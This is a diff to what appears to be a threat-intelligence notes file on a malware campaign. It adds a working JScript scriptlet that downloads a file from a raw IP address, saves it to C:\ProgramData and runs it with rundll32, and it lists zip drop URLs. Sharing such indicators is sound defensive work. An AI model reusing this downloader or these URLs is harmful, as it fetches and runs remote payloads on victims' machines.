@@ -17,6 +17,29 @@ rundll32 C:\ProgramData\aq2B7wGiC3.tmp,Motd
 
 *************************************************
 
+<?xml version="1.0"?>
+<package>
+<component id="compid">
+<script language="JScript">
+<![CDATA[
+
+	var http = new ActiveXObject("microsoft.xmlhttp");
+	http.open("GET", "http://51.222.96.42/aSxBaqnfj98w.dat", false);
+	http.send();
+
+	var adodb = new ActiveXObject("adodb.stream");
+	adodb.type = 1;
+	adodb.open();
+	adodb.write(http.ResponseBody);
+	adodb["savetofile"]("c:\\programdata\\aq2B7wGiC3.tmp", 2);
+
+]]>
+</script>
+</component>
+</package>
+
+*************************************************
+
 zip drop urls:
 
 http://eventstream.asia/pEp/643edc83ad4ff.zip
